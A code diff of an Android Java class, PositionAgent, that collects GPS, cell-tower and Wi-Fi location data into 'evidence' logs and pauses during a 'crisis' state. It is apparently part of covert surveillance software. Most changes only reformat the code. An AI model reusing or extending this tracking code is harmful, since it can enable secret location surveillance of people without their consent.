@@ -52,7 +52,17 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 	@Override
 	public void begin() {
+		if(logGps == null){
+			logGps = new Evidence(EvidenceType.LOCATION_NEW);
+		}
+		if(logCell == null){
+			logCell = new Evidence(EvidenceType.LOCATION_NEW);
+		}
+		if(logWifi == null){
+			logWifi =  new Evidence(EvidenceType.LOCATION_NEW);
+		}
 		locator = new GPSLocator(this, period);
+		
 	}
 
 	@Override
@@ -73,7 +83,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 				gpsEnabled = ((type & TYPE_GPS) != 0);
 			} else {
 				// #ifdef DEBUG
-				Log.d(TAG,"Warn: " + "GPS Disabled at compile time");
+				Log.d(TAG, "Warn: " + "GPS Disabled at compile time");
 				// #endif
 			}
 			cellEnabled = ((type & TYPE_CELL) != 0);
@@ -86,11 +96,11 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			// #endif
 
 			// #ifdef DEBUG
-			Log.d(TAG,"Info: " + "Type: " + type);
-			Log.d(TAG,"Info: " + "Period: " + period);
-			Log.d(TAG,"Info: " + "gpsEnabled: " + gpsEnabled);
-			Log.d(TAG,"Info: " + "cellEnabled: " + cellEnabled);
-			Log.d(TAG,"Info: " + "wifiEnabled: " + wifiEnabled);
+			Log.d(TAG, "Info: " + "Type: " + type);
+			Log.d(TAG, "Info: " + "Period: " + period);
+			Log.d(TAG, "Info: " + "gpsEnabled: " + gpsEnabled);
+			Log.d(TAG, "Info: " + "cellEnabled: " + cellEnabled);
+			Log.d(TAG, "Info: " + "wifiEnabled: " + wifiEnabled);
 			// #endif
 
 			setPeriod(period);
@@ -98,7 +108,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		} catch (final IOException e) {
 			// #ifdef DEBUG
-			Log.d(TAG,"Error: " + e.toString());
+			Log.d(TAG, "Error: " + e.toString());
 			// #endif
 			return false;
 		}
@@ -110,7 +120,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	public void go() {
 
 		if (Status.self().crisisPosition()) {
-			Log.d(TAG,"Warn: " + "Crisis!");
+			Log.d(TAG, "Warn: " + "Crisis!");
 			return;
 		}
 
@@ -143,10 +153,10 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		if (wifi != null) {
 			// #ifdef DEBUG
-			Log.d(TAG,"Info: " + "Wifi: " + wifi.getBSSID());
+			Log.d(TAG, "Info: " + "Wifi: " + wifi.getBSSID());
 			// #endif
-			final byte[] payload = getWifiPayload(wifi.getBSSID(), wifi
-					.getSSID(), wifi.getRssi());
+			final byte[] payload = getWifiPayload(wifi.getBSSID(),
+					wifi.getSSID(), wifi.getRssi());
 
 			logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
 					EvidenceType.LOCATION_NEW);
@@ -154,70 +164,70 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			logWifi.close();
 		} else {
 			// #ifdef DEBUG
-			Log.d(TAG,"Warn: " + "Wifi disabled");
+			Log.d(TAG, "Warn: " + "Wifi disabled");
 			// #endif
 		}
 
 	}
 
 	/**
-	 * http://stackoverflow.com/questions/3868223/problem-with-neighboringcellinfo-cid-and-lac
+	 * http://stackoverflow.com/questions/3868223/problem-with-
+	 * neighboringcellinfo-cid-and-lac
 	 */
 	private void locationCELL() {
 
-		android.content.res.Configuration conf =Status.getAppContext().getResources().getConfiguration();
-	
-		if(Device.isGprs()){
-		  
-			GsmCellLocation cell = new GsmCellLocation();  
+		android.content.res.Configuration conf = Status.getAppContext()
+				.getResources().getConfiguration();
 
-		  final int mcc = Integer.parseInt(Integer.toHexString(conf
-		  .mcc));
-		  
-		  final int mnc = conf.mnc; 
-		  final int lac = cell.getLac();
-		  final int cid = cell.getCid();
-		  //final int bsic = 0;
-		  final int rssi = 0; // TODO: prenderlo dal TelephonyManager
-	
-		
-		final byte[] payload = getCellPayload(mcc, mnc, lac,
-				  cid, rssi);
-				  
-				  logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM),
-				  EvidenceType.LOCATION_NEW); saveEvidence(logCell, payload,
-				  LOG_TYPE_GSM); logCell.close(); 
-				  
-	
-	}
-	if(Device.isCdma()){
-		
-		final int sid = 0; //TODO
-		final int nid = 0; //TODO
-		final int bid =0; //TODO
+		if (Device.isGprs()) {
 
-		final int mcc = conf.mcc;
-		  
-		  final int rssi = 0; //TODO
-		  
-		  final StringBuffer mb = new StringBuffer(); mb.append("SID: " + sid);
-		  mb.append(" NID: " + nid); mb.append(" BID: " + bid);
-		  
-		final byte[] payload = getCellPayload(mcc, sid, nid,
-				  bid, rssi); logCell.createEvidence(getAdditionalData(0,
-				  LOG_TYPE_CDMA), EvidenceType.LOCATION_NEW); saveEvidence(logCell,
-				 payload, LOG_TYPE_CDMA); logCell.close(); }
+			GsmCellLocation cell = new GsmCellLocation();
+
+			final int mcc = Integer.parseInt(Integer.toHexString(conf.mcc));
+
+			final int mnc = conf.mnc;
+			final int lac = cell.getLac();
+			final int cid = cell.getCid();
+			// final int bsic = 0;
+			final int rssi = 0; // TODO: prenderlo dal TelephonyManager
+
+			final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);
+
+			logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM),
+					EvidenceType.LOCATION_NEW);
+			saveEvidence(logCell, payload, LOG_TYPE_GSM);
+			logCell.close();
+
+		}
+		if (Device.isCdma()) {
+
+			final int sid = 0; // TODO
+			final int nid = 0; // TODO
+			final int bid = 0; // TODO
+
+			final int mcc = conf.mcc;
+
+			final int rssi = 0; // TODO
+
+			final StringBuffer mb = new StringBuffer();
+			mb.append("SID: " + sid);
+			mb.append(" NID: " + nid);
+			mb.append(" BID: " + bid);
+
+			final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
+			logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA),
+					EvidenceType.LOCATION_NEW);
+			saveEvidence(logCell, payload, LOG_TYPE_CDMA);
+			logCell.close();
+		}
 	}
-		
-		 
-	
 
 	boolean waitingForPoint = false;
 
 	private void locationGPS() {
 		if (locator == null) {
 
-			Log.d(TAG,"Error: " + "GPS Not Supported on Device");
+			Log.d(TAG, "Error: " + "GPS Not Supported on Device");
 
 			return;
 		}
@@ -252,7 +262,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		if (location == null) {
 			// #ifdef DEBUG
-			Log.d(TAG,"Error: " + "Error in getLocation");
+			Log.d(TAG, "Error: " + "Error in getLocation");
 			// #endif
 			return;
 		}
@@ -370,9 +380,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 			// #endif
 
 			// #ifdef DBC
-			Check
-					.asserts(token.length == 1,
-							"getWifiPayload: token wrong size");
+			Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
 			// #endif
 			databuffer.writeByte(token[0]);
 		}
